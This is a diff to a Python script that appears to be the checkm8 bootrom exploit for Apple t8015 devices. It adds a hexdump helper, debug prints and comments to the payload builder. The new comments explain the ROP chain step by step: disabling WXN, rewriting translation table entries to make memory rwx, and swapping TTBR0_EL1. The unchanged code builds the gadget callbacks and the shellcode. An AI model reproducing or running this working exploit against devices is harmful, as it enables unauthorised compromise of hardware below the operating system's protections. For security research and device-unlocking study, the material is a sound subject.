@@ -51,12 +51,43 @@ def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wInd
   except usb.core.USBError:
     pass
 
+def hexdump(start, packed_struct):
+    # why is this the way it is
+    payload_s = binascii.hexlify(packed_struct)
+    for i in range(0, len(payload_s), 32):
+        bytes = binascii.unhexlify(payload_s[i:i+32])
+        print "{}: ".format(hex(start)),
+
+        for j in range(len(bytes)):
+            byte = int(hex(ord(bytes[j])), 16)
+            fmt = "{:02x}".format(byte)
+            print fmt,
+
+        print "  ",
+
+        for j in range(len(bytes)):
+            toprint = ord(bytes[j])
+
+            if toprint >= 32 and toprint <= 126:
+                toprint = chr(toprint)
+            else:
+                toprint = "."
+
+            sys.stdout.write(toprint)
+
+        print
+        start += 16
+
+    return
+
 def usb_rop_callbacks(address, func_gadget, callbacks):
   data = ''
   for i in range(0, len(callbacks), 5):
+    # print(i)
     block1 = ''
     block2 = ''
     for j in range(5):
+      # print("{}: i {} j {}".format(hex(address), i, j))
       address += 0x10
       if j == 4:
         address += 0x50
@@ -67,6 +98,7 @@ def usb_rop_callbacks(address, func_gadget, callbacks):
         block1 += struct.pack('<2Q', func_gadget, 0)
         block2 += struct.pack('<2Q', callbacks[i+j][1], callbacks[i+j][0])
       else:
+        # block1 += struct.pack('<2Q', 0x4141414141414141, 0)
         block1 += struct.pack('<2Q', 0, 0)
     data += block1 + block2
   return data
@@ -412,6 +444,7 @@ def payload(cpid):
       (t8015_dc_civac, 0x18001C840),
       (t8015_dc_civac, 0x18001C880),
       (t8015_dmb, 0),
+      # Disable WXN
       (t8015_write_sctlr_gadget, 0x100D),
       # The load write gadgets are used to write the TTEs to places the
       # payload cannot cover. This is the gadget:
@@ -423,6 +456,20 @@ def payload(cpid):
       # at +8. So in order for this to work, we have to subtract 8 from the
       # destination address, which is exactly what happens in the below
       # struct.pack.
+      #
+      # The first load write gadget just puts the same TTE for the ROM
+      # [0x100000000, 0x102000000) (r-x) in the same +0x400 spot, but from
+      # 0x180020000.
+      #
+      # The second load write gadget grants rwx permissions for
+      # [0x180000000, 0x182000000), +0x600
+      #
+      # Then TTBR0_EL1 is changed to 0x180020000 so the new TTEs are seen
+      # by the MMU.
+      #
+      # Now we're able to change the original TTE for [0x180000000, 0x182000000)
+      # since that lives at 0x18000c600. We make that 32 MB block rwx then
+      # swap TTBR0_EL1 back to its original value.
       (t8015_load_write_gadget, 0x18001C000),
       (t8015_load_write_gadget, 0x18001C010),
       (t8015_write_ttbr0, 0x180020000),
@@ -430,14 +477,22 @@ def payload(cpid):
       (t8015_load_write_gadget, 0x18001C020),
       (t8015_write_ttbr0, 0x18000C000),
       (t8015_tlbi, 0),
+      # [0x180000000, 0x182000000) was marked as rwx earlier, so this works
       (0x18001C800, 0),
     ]
     t8015_callback_data = usb_rop_callbacks(0x18001C020, t8015_func_gadget, t8015_callbacks)
     t8015_handler = asm_arm64_x7_trampoline(t8015_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8015)[4:]
     t8015_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8015)
+    print(len(t8015_shellcode))
     assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
     t8015_shellcode = t8015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
+    # XXX Original:
+    #  6Q is for the TTEs
+    #  16x is for 16 zero bytes
+    #  448s is for the callback data
+    #  1536x is for 0x600 zero bytes
+    #  1024s is for shellcode
     return struct.pack('<6Q16x448s1536x1024s', 0x180020400-8, 0x1000006A5, 0x180020600-8, 0x180000625, 0x18000C600-8, 0x180000625, t8015_callback_data, t8015_shellcode)
 
 def all_exploit_configs():
@@ -484,35 +539,10 @@ def exploit():
   start = time.time()
   print 'Found:', device.serial_number
   payload, config = exploit_config(device.serial_number)
-  payload_s = binascii.hexlify(payload)
+  # payload, config = exploit_config("CPID:8015 CPRV:11 CPFM:03 SCEP:01 BDID:0A ECID:<> IBFL:3C SRTG:[iBoot-3332.0.0.1.23]")
 
   # t8015
-  # start = 0x18001c000
-
-  # for i in range(0, len(payload_s), 32):
-  #     bytes = binascii.unhexlify(payload_s[i:i+32])
-  #     print "{}: ".format(hex(start)),
-
-  #     for j in range(len(bytes)):
-  #         byte = int(hex(ord(bytes[j])), 16)
-  #         fmt = "{:02x}".format(byte)
-  #         print fmt,
-
-  #     print "  ",
-
-  #     for j in range(len(bytes)):
-  #         toprint = ord(bytes[j])
-
-  #         if toprint >= 32 and toprint <= 126:
-  #             toprint = chr(toprint)
-  #         else:
-  #             toprint = "."
-
-  #         sys.stdout.write(toprint)
-
-  #     print
-  #     start += 16
-
+  hexdump(0x18001c000, payload)
   # return
 
   if 'PWND:[' in device.serial_number:
